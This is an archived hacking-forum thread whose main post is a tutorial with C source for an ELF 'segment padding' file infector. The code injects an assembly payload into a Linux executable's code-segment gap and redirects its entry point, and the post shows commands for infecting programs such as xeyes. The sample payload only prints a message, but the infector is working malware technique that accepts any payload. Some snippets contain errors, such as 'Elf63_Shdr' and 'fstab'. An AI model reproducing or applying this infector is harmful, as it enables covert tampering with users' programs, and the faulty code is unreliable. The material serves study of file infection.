<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>ELFun File Injector - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="As it doesn’t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. 
The proce&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="410.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;ELFun File Injector&#39;" href="410.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" />
<meta property="og:url" content="https://0x00sec.org/t/elfun-file-injector/410" />
<meta name="twitter:url" content="https://0x00sec.org/t/elfun-file-injector/410" />
<meta property="og:title" content="ELFun File Injector" />
<meta name="twitter:title" content="ELFun File Injector" />
<meta property="og:description" content="As it doesn’t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems.  The process I will describe is slightly different from the one explained in the PE counterpart, so you will get a different view of the process and hopefully that will help you to better understand how do these things work. Moreover, it does not feel right to just write the same thing eve..." />
<meta name="twitter:description" content="As it doesn’t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems.  The process I will describe is slightly different from the one explained in the PE counterpart, so you will get a different view of the process and hopefully that will help you to better understand how do these things work. Moreover, it does not feel right to just write the same thing eve..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="elf" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="8 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="59 ❤" />
<meta property="article:published_time" content="2016-05-19T17:59:39+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="410%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="410.html">ELFun File Injector</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
<a href="../../tag/elf.html" class="discourse-tag" rel="tag">elf</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="ELFun File Injector">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="malware, elf">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T17:59:39Z" class="post-time">
May 19, 2016, 5:59pm
</time>
<meta itemprop="dateModified" content="2016-06-08T15:12:04Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>As it doesn’t look that <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> is going to cover linux stuff, I have wrote a quick and dirty version of the great <a href="../pe-file-injection/401.html">PE File Infector</a> paper from <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> but targeting <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" rel="noopener nofollow ugc">ELF</a> binaries specifically under GNU/Linux systems.</p>
<p>The process I will describe is slightly different from the one explained in the PE counterpart, so you will get a different view of the process and hopefully that will help you to better understand how do these things work. Moreover, it does not feel right to just write the same thing even if it is targeting to a different system.</p>
<p>So, let’s start.</p>
<h1>Infection Technique</h1>
<p>If you had read the “PE File Infector” paper in this site, you should already know what a code cave is. If you do not know that, go and read it, right now.</p>
<p>In the Linux world, you will find references to this technique as <strong>Segment padding infection</strong>. It is basically the same thing, I’m saing just in case you want to look for further information.</p>
<p>The infection technique we are going to implement is as follow:</p>
<ul>
<li>Find the padding area between the <code>.text</code> segment and the next segment in the program (that is usually <code>.data</code>).</li>
<li>Append the payload code to the end of the <code>.text</code> segment (in that padding area)</li>
<li>Patch the ELF binary to run the injected coded at start up (modify the ELF entry point)</li>
<li>Patch the payload to return execution to the original ELF entry point</li>
</ul>
<p>The technique takes advantage of the padding areas in the segments. This, basically happen because the operating system works with a Page granularity. It is related to the processor memory management unit, but that is a bit out of scope. So, in general, there is an unused area at the end of the <code>.text</code> segment. The size of that area depends on the size of the code, and may even not exist or just be a couple of bytes. For that reason, this technique may not work with some programs.</p>
<p>The main advantage of this technique is that the file size and the overall ELF data structures are not modified at all (with the exception of the application entry point).</p>
<h1>Writing an Infector</h1>
<p>The ELF code injector is pretty straightforward. The main function is a bit long, so I will divide it in smaller functional blocks in the hope that it will be easier to follow.</p>
<p>You can find the whole source code at github.</p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
<a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfun" target="_blank" rel="noopener nofollow ugc">GitHub</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width height>
<h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfun" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>
<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<h2>Opening the target ELF File</h2>
<p>The first thing the main function does (after a quick check of the number of parameters) is to open the target ELF File. The code looks like this:</p>
<pre><code class="lang-auto">int
main (int argc, char *argv[])
{
  void        *d, *d1;
  int         target_fd, payload_fd;
  int         fsize, fsize1;

  printf ("Segment Padding Infector for 0x00sec\nby pico\n\n");
  if (argc != 3)
    {
      fprintf (stderr, "Usage:\n  %s elf_file payload\n", argv[0]);
      exit (1);
    }

  /* Open and map target ELF and payload */
  target_fd  = elfi_open_and_map (argv[1], &amp;d, &amp;fsize);
  payload_fd = elfi_open_and_map (argv[2], &amp;d1, &amp;fsize1);
</code></pre>
<p>OK, there is not much to say about this, the main function opens and maps the target ELF to inject our code into and the code to be injected… let’s continue looking into the <code>elfi_open_and_map</code> function:</p>
<pre><code class="lang-auto">int
elfi_open_and_map (char *fname, void **data, int *len)
{
  int   size;
  int   fd;
  
  if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
    {
      perror ("open:");
      exit (1);
    }
  
  size = get_file_size (fd);
  if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
      perror ("mmap:");
      exit (1);
    }
  
  printf ("+ File mapped (%d bytes ) at %p\n", size, data);
  *len = size;
  return fd;
}
</code></pre>
<p>This function does three things:</p>
<ol>
<li>It open the file using <code>open</code>
</li>
<li>Then it uses a utility function called <code>get_file_size</code> to find out the size of the file. We need this information for the last step. The <code>get_file_size</code> function just calls <code>fstab</code> (I will not include it here as it is not really interesting)</li>
<li>It memory maps the file. This means that we can access the file as if it were in memory (using pointers), but we are actually modifying the file in disk. So, this is a very convenient way of patching a file</li>
</ol>
<p>The function returns the file descriptor and uses to output parameters to return the pointer to the memory mapped area (that is the beginning of our file) and its size.</p>
<h2>Getting information</h2>
<p>Now that we have access to our files, we will store some information:</p>
<pre><code class="lang-auto">  /* Get Application Entry point */
  elf_hdr = (Elf64_Ehdr *) d;
  ep = elf_hdr-&gt;e_entry;
  printf ("+ Target Entry point: %p\n", (void*) ep);
</code></pre>
<p>As we said, the pointer returned by <code>elfi_open_and_map</code> points to the actual content of the file. For an ELF file, the first thing we find is the ELF header. Take a look to the <a href="http://refspecs.linuxbase.org/elf/elf.pdf" rel="noopener nofollow ugc">specs</a> to find out the information kept by this structure.</p>
<p>Right now, we are interested in the application entry point. That is the address where program will start its execution. Think about it as the memory address for the <code>main</code> function… It is not that easy, but for our current discussion such a definition should be OK.</p>
<h2>Finding a gap</h2>
<p>Now we have to find a gap in the target file. We had wrote a function to do that, which we call from the <code>main</code> function:</p>
<pre><code class="lang-auto"> Elf64_Phdr  *t_text_seg = elfi_find_gap (d, fsize, &amp;p, &amp;len);
 Elf64_Addr  *base = t_text_seg-&gt;p_vaddr;
</code></pre>
<p>The <code>elfi_find_gap</code> function will go through all the ELF segments and try to find the gap in the one that holds the code. It returns a pointer to the ELF segment structure that we will use later. It also returns the offset in the file to the gap and its size, using a couple of output parameters</p>
<p>After finding the code segment, we will also store the memory address where that code will be loaded. This is usually 0x400000, but it may be different on some applications.</p>
<p>The <code>elfi_find_gap</code> function looks like this:</p>
<pre><code class="lang-auto">Elf64_Phdr*
elfi_find_gap (void *d, int fsize, int *p, int *len)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg, *text_seg;
  int         n_seg = elf_hdr-&gt;e_phnum;
  int         i;
  int         text_end, gap=fsize;

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr-&gt;e_phoff);

  for (i = 0; i &lt; n_seg; i++)
    {
      if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; elf_seg-&gt;p_flags &amp; 0x011)
	{
	  printf ("+ Found .text segment (#%d)\n", i);
	  text_seg = elf_seg;
	  text_end = elf_seg-&gt;p_offset + elf_seg-&gt;p_filesz;
	}
      else
	{
	  if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; 
	      (elf_seg-&gt;p_offset - text_end) &lt; gap) 
	    {
	      printf ("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n",
		      i, (unsigned int)elf_seg-&gt;p_offset);
	      gap = elf_seg-&gt;p_offset - text_end;
	    }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

  *p = text_end;
  *len = gap;

  printf ("+ .text segment gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);

  return text_seg;
}
</code></pre>
<p>Once again, we first access the ELF header to figure out where, within the file, the segment information is stored. It actually is at the offset specified by the header’s field <code>e_phoff</code>. With all this information, we can start checking the segments.</p>
<p>First we look for a segment of type <code>PT_LOAD</code> with execution permissions. Normally there is only one, and it is the one containing the <code>.text</code> section, and therefore the application code. When we find it, we store the pointer to the segment structure (to return it later) and the offset to the actual end of the section in the file.</p>
<p>Then we keep looking for <code>PT_LOAD</code> segments and we calculate the gap with respect to the current executable segment we have already found, and we store the one with the smallest gap.</p>
<p>This function probably can be heavily improved. Normally there are only two PT_LOAD segment and they one after the other in the file. I was not sure if it is possible to get those segments out of order in the file (in theory should be possible) so that is why the function is a bit complex.</p>
<p>Oh sure, <code>PT_LOAD</code> segments are those that are directly loaded from the file. Other segments like the ones containing the stack or the .bss section are not stored in the file, but the code and static data have to be there and the <code>PT_LOAD</code> type is the way the system knows that the data in the file has to be loaded in memory.</p>
<h2>The Payload</h2>
<p>We have to stop for a sec, looking to our infector code and take a look to the payload we are going to use and how to get it into memory. We had just write a simple payload that prints a message in the console. I know that is not very impressive, but this is already becoming a bit long and complex howto.</p>
<p>So, our payload looks like this:</p>
<pre><code class="lang-auto">section .text
        global _start

_start:
        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

	mov rax, 0x11111111
	jmp rax

align 8
        msg     db 'This file has been infected for 0x00SEC',0x0a,0
	msg_end db 0x0
</code></pre>
<p>It is the classical <code>Hello World</code> assembler program, but, just after printing the message, it will jump back to somewhere. The 0x11111111 is a mark where we will have to write the original ELF access point, to let the original application run normally.</p>
<p>As usual, we can compile this small program with:</p>
<pre><code class="lang-auto">nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
</code></pre>
<p>And we are done to get back to our ELF injector.</p>
<h1>Processing the payload</h1>
<p>You could just use some external tool to produce an hex dump of the payload code. Check <span class="mention">@unh0lys0da</span> <a href="../linux-shellcoding-part-1-0/289.html">shellcode tutorial</a> for details. In this case, as we are playing with the ELF format, we are going to directly use the binary produced by nasm.</p>
<p>The way we used to compile our payload, was actually producing a ELF file. If you recall the beginning of the paper we had already opened the payload and mapped it on memory. Now we just need to find out where the actual code is, and copy it in the <code>.text</code> segment gap of the target program we have found before.</p>
<p>This is what the code below does:</p>
<pre><code class="lang-auto">  Elf63_Shdr *p_text_sec = elfi_find_section (d1, ".text");

  printf ("+ Payload .text section found at %lx (%lx bytes)\n", 
	  p_text_sec-&gt;sh_offset, p_text_sec-&gt;sh_size);

  if (p_text_sec-&gt;sh_size &gt; len)
    {
      fprintf (stderr, "- Payload to big, cannot infect file.\n");
      exit (1);
    }
  /* Copy payload in the segment padding area */
  memmove (d + p, d1 + p_text_sec-&gt;sh_offset, p_text_sec-&gt;sh_size);

</code></pre>
<p>First we call a function (that we will describe in a sec) to find out where the <code>.text</code> section is, and therefore where the payload code is. The function returns a pointer to an ELF section structure that contains all the information we need.</p>
<p>Then we have to check if the size of the <code>.text</code> section of the payload (our code) fits in the gap we had previously found, and finally we just copy the payload code into the target file just at the end of the executable segment. Using the pointer returned by <code>elfi_find_gap</code>.</p>
<h2>Finding a Section in an ELF File</h2>
<p>So, we have to take a look to the <code>elfi_find_section</code> function. Here it is</p>
<pre><code class="lang-auto">Elf64_Shdr *
elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
  Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
  const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;
   
  printf ("+ %d section in file. Looking for section '%s'\n", 
	  elf_hdr-&gt;e_shnum, name);
  
  
  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
    {
      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp (sname, name))  return &amp;shdr[i];
    }
  
  return NULL;
}

</code></pre>
<p>In order to find a section by name, we have to access to the symbol table in the ELF file. That table stores all the symbols required by the executable. Section names, external libraries, relocation symbols names,… Everything that is a human readable string.</p>
<p>The section list in the ELF file stores the section name as an index in the symbol table. So, despite of all that pointer gymnastics, the function is just looping through the section list, retrieving the name using the information there, and comparing that string with the passed parameter.</p>
<p>Just open the ELF spec, and start following the data structures. It’s just tedious but not difficult.</p>
<h1>Patching Entry Points</h1>
<p>So, we are almost done. Now we just need to patch the entry points. This is done with the following code in the <code>main</code> function:</p>
<pre><code class="lang-auto">  /* Patch return address */
  elfi_mem_subst (d+p, p_text_sec-&gt;sh_size, 0x11111111, (long)ep);

  /* Patch entry point */
  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

  /* Close files and actually update target file */
  close (payload_fd);
  close (target_fd);

</code></pre>
<p>The <code>elfi_mem_subst</code> function just looks for the sequence <code>0x11111111</code> (do you remember it in our payload?), and substitutes it with the original ELF entry point. This will start the target application just after running our payload.</p>
<p>Then, for the main entry point, we just use our ELF Header pointer and write there the address for our payload, so it gets executed when the application is executed. We calculate the payload address as the base address we have got from the execution segment plus the offset to the segment gap we found at the beginning.</p>
<p>Once we are done, we just close the files to make sure that all the changes we made in the memory mapped area, make it to the file.</p>
<p>Just for completeness, let’s take a look to <code>elfi_mem_subtr</code>:</p>
<pre><code class="lang-auto">int
elfi_mem_subst (void *m, int len, long pat, long val)
{
  unsigned char *p = (unsigned char*)m;
  long v;
  int i, r;

  for (i = 0; i &lt; len; i++)
    {
      v = *((long*)(p+i));
      r = v ^pat;

      if (r ==0) 
	{
	  printf ("+ Pattern %lx found at offset %d -&gt; %lx\n", pat, i, val);
	  *((long*)(p+i)) = val;
	  return 0;
	}
    }
  return -1;
}

</code></pre>
<p>Nothing special, we just scan the payload byte by byte to find our mark. When found, it is substituted by the value passed as a parameter (in this case the original entry point).</p>
<h1>Using the injector</h1>
<p>So, compile the application and generate your payload</p>
<pre><code class="lang-auto">$ make elf_injector
$ nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
</code></pre>
<p>An then just start injecting your payload:</p>
<pre><code class="lang-auto">$ ./elf_inject xeyes payload
</code></pre>
<p>I had tried the program with some binaries in my system. I have to say that it had failed with some, and I do not know yet the reason. Some of the ones I successfully used were: xeyes, vim, lynx…</p>
<p>It failed with evince, for instance… So, lucky you, it is not perfect, and you have something to look at and play with :)… Have ELFun!</p>
<h1>Final Words</h1>
<p>If you are planning to look further into this topic (you should, it is really interesting), it would be a good idea to install the <code>readelf</code> for easily inspect your ELF files.</p>
<p>Also make sure that <code>xxd</code> is available to do hex dump and check that you are dumping data in the right place.</p>
<p>I have wrote this pretty quickly so it may not be the most comprehensive howto and some parts may be hard to follow. Let me know in the comments if something needs improvement</p>
<p>Happy Hacking!<br>
pico</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="21" />
<span class="post-likes">21 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../dissecting-and-exploiting-elf-files/7267.html">Dissecting and exploiting ELF files</a>
<meta itemprop="position" content="6">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../a-simple-linux-crypter/537.html">A simple Linux Crypter</a>
<meta itemprop="position" content="7">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../doubt-infect-elf/13605.html">Doubt infect ELF</a>
<meta itemprop="position" content="8">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../how-to-extend-python-with-c/574/2.html">How To: Extend Python with C</a>
<meta itemprop="position" content="9">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../what-are-you-working-on/4418/2.html">What are you working on?</a>
<meta itemprop="position" content="10">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T18:59:01Z" class="post-time">
May 19, 2016, 6:59pm
</time>
<meta itemprop="dateModified" content="2016-05-19T18:59:01Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Woah, why did I never tried this. Basicly this is just Linux malware right?<br>
This is so awesome, thanks for opening my eyes &lt;3<br>
Fuck Windows Internals, I’m gonna focus on this ^^.<br>
Amazing article!</p>
<p>unh0lys0da</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T22:10:01Z" class="post-time">
May 19, 2016, 10:10pm
</time>
<meta itemprop="dateModified" content="2016-05-19T22:10:01Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Such an amazing article man! Keep it up!!!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T22:27:03Z" class="post-time">
May 19, 2016, 10:27pm
</time>
<meta itemprop="dateModified" content="2016-05-19T22:27:03Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I’ll be reading this a few times – to grasp it.</p>
<p>BTW: There’s a bug in your first snippet: You passed <code>fsize</code> twice, rather than passing <code>fsize1</code> the second time.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-20T05:00:22Z" class="post-time">
May 20, 2016, 5:00am
</time>
<meta itemprop="dateModified" content="2016-05-20T05:00:22Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I guess so. May main interest on these topic was to patch or update applications when the source code is not available or dealing with legacy system.</p>
<p>But yes… a binary patching system and a malware works pretty much the same way <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Thanks</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="410.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-20T05:05:08Z" class="post-time">
May 20, 2016, 5:05am
</time>
<meta itemprop="dateModified" content="2016-05-20T05:05:08Z">
<span itemprop="position">6</span>
</span>
</div>
